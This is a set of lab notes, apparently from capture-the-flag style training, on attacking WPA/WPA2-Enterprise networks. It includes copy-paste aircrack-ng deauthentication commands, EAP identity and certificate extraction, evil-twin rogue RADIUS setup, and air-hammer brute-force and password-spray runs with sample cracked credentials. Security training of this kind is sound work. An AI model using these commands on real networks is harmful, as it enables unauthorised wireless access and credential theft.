# Chain #26: WPA-Enterprise

**Purpose:** concise, actionable notes for recon and attacking WPA/WPA2-Enterprise networks. Includes how 802.1X/EAP authentication works, common EAP methods (PEAP, TTLS, EAP‑TLS), reconnaissance commands and filters, how to extract usernames and certificates from captures, and practical attack paths (brute‑force, evil‑twin). Use this as a lab checklist — copy/paste commands and follow the workflows.

---

## Key terms

- **802.1X / RADIUS:** authentication framework used by WPA-Enterprise; AP acts as authenticator, RADIUS server performs authentication.
    
- **EAP (Extensible Authentication Protocol):** framework that encapsulates many authentication methods (PEAP, TTLS, EAP‑TLS, MSCHAPv2, GTC, etc.).
    
- **UPA (Username & Password Authentication):** user authenticates with credentials (often tunneled inside PEAP/TTLS).
    
- **CBA (Certificate-Based Authentication):** uses client/server certificates (EAP‑TLS, PEAP‑TLS) for strong auth.
    
- **PMK / PMKID / PMK cache:** Pairwise Master Key and its identifier; cached PMKs permit faster roaming and can affect whether a full EAP handshake is triggered.
    
- **Anonymous Identity:** technique clients use to hide the real identity during outer tunnel (may show `anonymous` or `anonymous@realm`).
    

---

## Step-by-step workflows

(1) **Recon — find Enterprise APs & note PMKID / EAP info**

1. Enable monitor mode: `sudo airmon-ng start wlan0` (creates `wlan0mon`).
    
2. Quick scan: `airodump-ng wlan0mon` — look for `AUTH` column showing `MGT` (enterprise).
    
3. Targeted capture and save: `airodump-ng -c <ch> --bssid <BSSID> -w WPA wlan0mon` — writes `WPA-01.cap`.
    

**Example**

```
airodump-ng wlan0mon -c 1 -w WPA
# shows: 9C:9A:03:39:BD:7A  ...  WPA2 CCMP  MGT  HTB-Corp
```

Note whether `Notes` or `#Data` show `PMKID` — AP/client may be using PMK caching.

---

(2) **Force full EAP handshake (if PMK caching disabled)**

- Deauth the client to force reauth: `aireplay-ng -0 1 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon`.
    
- Watch `airodump-ng` to see EAPOL exchange; a full EAP handshake will be captured only if PMK cache is disabled or expired.
    

---

(3) **Extract username / domain from capture**

- Open `WPA-01.cap` in Wireshark and filter `eap` → look for **EAP Response Identity** frames showing `Domain\Username` or `username`.
    
- Command-line extraction (tshark):
    

```
tshark -r WPA-01.cap -Y '(eap && wlan.ra == <AP_BSSID>) && (eap.identity)' -T fields -e eap.identity
# Example output: HTB\Ketty
```

- Automated harvesting: `crEAP.py` listens and extracts EAP identities automatically (interactive tool).
    

---

(4) **Extract RADIUS/TLS server certificate**

- TLS handshake (server certificate) is sent in clear during outer TLS tunnel. Extract with Wireshark filter:
    

```
(wlan.sa == <AP_BSSID>) && (tls.handshake.certificate)
```

- Or use provided script: `bash /opt/pcapFilter.sh -f /path/WPA-01.cap -C` → extracts cert to `/tmp/certs/*.der`.
    
- The certificate reveals fields (CN, O, issuer) useful to mimic a RADIUS server or create convincing evil‑twin config.
    

---

(5) **Enumerate supported EAP methods for a user (server probing)**

- Use `EAP_buster` with a real identity to query which EAP methods the RADIUS server supports for that user:
    

```
/opt/EAP_buster/EAP_buster.sh <AP_ESSID> '<IDENTITY>' wlan0mon
# Output lists supported / not supported methods (EAP-TLS, PEAP-MSCHAPv2, TTLS-EAP-MSCHAPv2, etc.)
```

- This helps pick the best attack path (brute-force MSCHAPv2 vs. TLS-based phishing).
    

---

(6) **Attacking paths — overview & quick workflows**

### A — Brute‑force username/password (online or offline)

- If you already have identity and captured exchange (e.g., MSCHAPv2 inside PEAP/TTLS), offline tools (e.g., `hashcat` against EAP‑MSCHAPv2 hashes) or `eaphammer`/`air-hammer` can attempt credential guesses.
    
- Workflows depend on whether you captured an inner hash (MSCHAPv2) or have a live online prompt to target.
    

### B — Evil‑Twin + Rogue RADIUS (credential capture)

1. Build fake AP with same ESSID/BSSID and configure a **RADIUS server** (hosted locally) to accept identity and capture inner auth.
    
2. Configure fake RADIUS to log challenge/response (e.g., MSCHAPv2) or capture plaintext for UPA.
    
3. Deauth target client from real AP to force reconnection; if client prefers strong signal & not pinned to certs, it may connect to evil‑twin and leak credentials.
    

**Considerations & flags**

- Are clients pinned to server certificates? (EAP‑TLS or pinned server certs stop this.)
    
- Does the client use anonymous outer identity? If so, the real identity is revealed only after tunnel establishment — still possible to proxy/relay.
    
- Is there Wireless IDS/IPS or network segmentation that will detect / block rogue APs?
    

Tools commonly used: `hostapd`/`airbase-ng` (evil AP), `freeradius` (rogue RADIUS), `EAPHammer` (automation), `crackmapexec` / hashcat for cracking captured challenge/response.

---

## Practical command snippets & explanations (copy/paste)

**Start monitor mode**

```bash
sudo airmon-ng start wlan0
# creates wlan0mon; may prompt to kill NetworkManager/wpa_supplicant
```

**Scan for Enterprise APs**

```bash
airodump-ng wlan0mon
# look for AUTH column == MGT
```

**Targeted capture (save)**

```bash
airodump-ng -c 1 --bssid 9C:9A:03:39:BD:7A -w WPA wlan0mon
# writes WPA-01.cap
```

**Force reauthentication (deauth)**

```bash
aireplay-ng -0 1 -a 9C:9A:03:39:BD:7A -c 9A:B7:A6:32:F3:D6 wlan0mon
```

**Extract identity with tshark**

```bash
tshark -r WPA-01.cap -Y '(eap && wlan.ra == 9c:9a:03:39:bd:7a) && (eap.identity)' -T fields -e eap.identity
# prints HTB\Ketty
```

**Run crEAP (automated identity harvesting)**

```bash
python2 /opt/crEAP/crEAP.py
# prompts for interface & channel; listens and prints EAP identities
```

**Extract certificate (script)**

```bash
bash /opt/pcapFilter.sh -f /home/wifi/WPA-01.cap -C
# saves cert(s) to /tmp/certs/*.der
```

**Probe RADIUS/EAP methods for an identity**

```bash
/opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Ketty' wlan0mon
# prints supported/not supported EAP methods for that identity
```

---

## Attacker considerations & detection risks

- Evil‑twin and rogue RADIUS attacks are noisy — may trigger wireless IDS/IPS and endpoint warnings (certificate warnings, captive‑portal alerts).
    
- Certificate pinning on clients (EAP‑TLS / PEAP with validation) greatly reduces success of rogue RADIUS attacks.
    
- PMK caching can prevent capturing a full EAP handshake; cache TTL varies (MS default 720 minutes) — you may need to wait for expiry or perform other tricks.
    
- Anonymous outer identities reduce the amount of harvestable info; inner identity may still be captured inside the tunnel only if you successfully establish a tunnel (rogue server) or MITM the connection.
    

---

## Performing Bruteforce Attacks (Air‑Hammer)

**When to use:** Online attacks against WPA/WPA2‑Enterprise where you have (1) SSID, (2) a username list and either (3) a single password or (4) a password list. Useful both for **horizontal** (one user, many passwords) and **password‑spray** (one password, many users) strategies.

### Tool overview & usage

Command help (as provided):

```
python2 /opt/air-hammer/air-hammer.py 

usage: air-hammer.py -i interface -e SSID -u USERFILE [-P PASSWORD]
                     [-p PASSFILE] [-s line] [-w OUTFILE] [-1] [-t seconds]

Perform an online, horizontal dictionary attack against a WPA Enterprise
network.

optional arguments:
  -i interface  Wireless interface (default: None)
  -e SSID       SSID of the target network (default: None)
  -u USERFILE   Username wordlist (default: None)
  -P PASSWORD   Password to try on each username (default: None)
  -p PASSFILE   List of passwords to try for each username (default: None)
  -s line       Optional start line to resume attack. May not be used with a
                password list. (default: 0)
  -w OUTFILE    Save valid credentials to a CSV file (default: None)
  -1            Stop after the first set of valid credentials are found
                (default: False)
  -t seconds    Seconds to sleep between each connection attempt (default:
                0.5)
```

> **Inputs you must supply:** monitor/inject‑capable interface, **SSID**, **user list**, and either a single **password** or a **password list**.

### Horizontal attack (one user, many passwords)

> You discovered an identity during recon (e.g., `HTB\Sentinal`). Include the domain prefix when testing.

```bash
echo "HTB\Sentinal" > user.txt
python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt
```

**Sample output (yours):**

```
[0]  Trying HTB\Sentinal:123456...
...
[!] VALID CREDENTIALS: HTB\Sentinal:football
```

### Password spray (one password, many users)

1. Build a domain‑prefixed user list (example uses statistically‑likely usernames):
    

```bash
cat /opt/statistically-likely-usernames/john.txt | awk '{print "HTB\\" $1}' > domain_users.txt
```

2. Spray a single password across all users:
    

```bash
python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt 
```

**Sample output (yours):**

```
[!] VALID CREDENTIALS: HTB\lisa:football
```

> If multiple users reuse the same password, this can yield several valid credential pairs.

### Resume a cancelled spray

Use `-s` with the **left‑hand index** from output to restart where it stopped:

```bash
python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt -s 65
```

**Sample output (yours):** continues from `[65]`.

### Operator notes

- Prefer **spray** with safe throttling (`-t` seconds) to reduce lockouts; consider maintenance windows.
    
- Store hits with `-w creds.csv`; optionally stop on first hit with `-1`.
    
- Pair with earlier recon (crEAP/EAP_buster) to ensure identities are valid and to pick viable inner methods.
    
- Online attacks are noisy; expect logging/alerts on RADIUS/WIDS.
    

---

## Summary

WPA‑Enterprise provides per‑user authentication and strong options (EAP‑TLS) but is still attackable via social engineering (evil‑twin), poorly configured clients (no certificate validation), or by brute‑forcing tunneled auth methods (e.g., MSCHAPv2). Reconnaissance is critical: capture identities and server certs first (tshark, crEAP, pcapFilter). Use `EAP_buster` to enumerate supported EAP methods and choose an appropriate attack type. Always assess detection risk and legal/ethical boundaries before testing.